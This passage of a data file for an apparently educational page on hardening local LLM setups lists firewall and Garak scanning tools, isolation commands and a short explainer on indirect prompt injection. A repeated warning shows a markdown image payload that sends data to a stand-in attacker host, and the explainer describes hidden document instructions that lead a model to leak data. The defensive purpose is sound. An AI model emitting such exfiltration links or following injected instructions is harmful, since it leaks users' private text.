          url: "https://www.obdev.at/products/littlesnitch/index.html",
          description: "Interactive host-based application firewall for macOS that monitors, visualizes, and blocks outbound telemetry connection attempts.",
          bestFor: "Real-time outbound telemetry packet auditing"
        },
        {
          name: "Garak LLM Scanner",
          type: "Free",
          url: "https://github.com/leondz/garak",
          description: "Open-source LLM vulnerability scanner that tests models for prompt injections, hallucination vectors, data leaks, and jailbreaks.",
          bestFor: "Automated LLM vulnerability scanning & red-team testing"
        }
      ],
      callouts: {
        mistake: "Assuming that because a model runs on your machine, it cannot leak data: indirect prompt injections can trick local models into rendering markdown images (`![img](https://attacker.com/leak?data=...)`), exfiltrating private text via image GET requests.",
        proTip: "Disable external image rendering and Markdown link prefetching in your web chat UI to neutralize the #1 indirect prompt injection exfiltration vector.",
        mistakes: [
          "Assuming that because a model runs on your machine, it cannot leak data: indirect prompt injections can trick local models into rendering markdown images (`![img](https://attacker.com/leak?data=...)`), exfiltrating private text via image GET requests.",
          "Failing to verify that system daemons (like Python telemetry or Hugging Face analytics) aren't silently reporting usage statistics in the background.",
          "Leaving local model API ports accessible to everyone on public coffee shop Wi-Fi networks without firewall isolation."
        ],
        proTips: [
          "Disable external image rendering and Markdown link prefetching in your web chat UI to neutralize the #1 indirect prompt injection exfiltration vector.",
          "Set `HF_HUB_OFFLINE=1` and `TRANSFORMERS_OFFLINE=1` in your shell environment to prevent Hugging Face libraries from checking remote servers on startup.",
          "Run your entire local AI stack inside an isolated Linux network namespace with zero default gateway route: `ip netns exec airgap_ai ...`."
        ]
      },
      promptLab: {
        recommendedModel: "Garak LLM Vulnerability Scanner + Ollama",
        variables: [
          {
            id: "threatVector",
            label: "Target Threat Vector",
            options: [
              "Indirect Prompt Injection (Data Exfiltration via Markdown)",
              "System Prompt Extraction & Jailbreak Bypasses",
              "Telemetry & Covert Network Beaconing",
              "Hallucinated Malware & Insecure Code Synthesis"
            ],
            defaultOption: "Indirect Prompt Injection (Data Exfiltration via Markdown)"
          },
          {
            id: "isolationTier",
            label: "Network Security Boundary",
            options: [
              "Complete Docker Air-Gap (--network none)",
              "Strict iptables Firewall (Drop all outbound WAN)",
              "Host Firewall Application Whitelist (Little Snitch)"
            ],
            defaultOption: "Complete Docker Air-Gap (--network none)"
          },
          {
            id: "auditFrequency",
            label: "Automated Audit Protocol",
            options: [
              "Continuous CI/CD Pipeline Scanning with Garak",
              "Monthly Penetration Testing & Weight Verification",
              "Pre-Deployment Air-Gap Telemetry Certification"
            ],
            defaultOption: "Pre-Deployment Air-Gap Telemetry Certification"
          }
        ],
        template: "# Complete Air-Gapped Network Verification & Garak Audit Suite\n\n# 1. Enforce Total Container Network Isolation\ndocker run -d \\\n  --name airgap-inference \\\n  --network none \\\n  -v /models:/models:ro \\\n  vllm-server\n\n# 2. Verify Zero Outbound Telemetry via tcpdump\nsudo tcpdump -i any not port 22 and not arp -n -c 50\n\n# 3. Execute Garak Automated Vulnerability Scan for [threatVector]\ngarak \\\n  --model_type rest \\\n  --uri http://localhost:8000/v1 \\\n  --probes promptinject,malware,leak,encoding \\\n  --report_prefix airgap_security_audit \\\n  --generations 5\n\n# 4. Review Garak HTML Vulnerability Report",
        expectedOutputs: [
          "Complete bash script enforcing network isolation and running tcpdump audit",
          "Automated Garak vulnerability scan report analyzing prompt injection resilience",
          "Hardening checklist confirming zero telemetry pings to external servers"
        ]
      },
      learning: {
        resources: [
          {
            title: "Garak: LLM Vulnerability Scanner & Red-Teaming Tool",
            badge: "GITHUB",
            url: "https://github.com/leondz/garak"
          },
          {
            title: "Docker: Network Isolation & Container Security Best Practices",
            badge: "OFFICIAL DOCS",
            url: "https://docs.docker.com/engine/security/protect-access/"
          }
        ]
      },
      conceptGuide: {
        title: "The Architecture of Air-Gapped LLM Security and Defense",
        overview: "Security in AI systems extends beyond traditional software hardening. Unlike deterministic code, probabilistic language models process untrusted natural language as executable instructions. Indirect prompt injection occurs when a model reads an untrusted document (such as a compromised PDF or email) containing hidden instructions that command the model to leak data or trigger tools. True defense-in-depth requires isolating the execution environment at the operating system level, stripping network interfaces, and neutralizing visual rendering vectors.",
        keyPoints: [
          {
            lead: "The Air-Gap Guarantee",
            text: "Running with `--network none` guarantees that even if a model is successfully jailbroken, it is physically impossible for it to exfiltrate bytes to the internet."
          },
          {
            lead: "Indirect Exfiltration Neutralization",
            text: "Sanitizing Markdown output to prevent automatic loading of remote image URLs neutralizes the primary vector of silent data exfiltration."
          },
          {
            lead: "Continuous Red-Team Scanning",
            text: "Regularly auditing local models with automated probe suites like Garak identifies emerging jailbreaks before malicious inputs encounter your systems."
          }
        ]
      }
    }
  ]
};
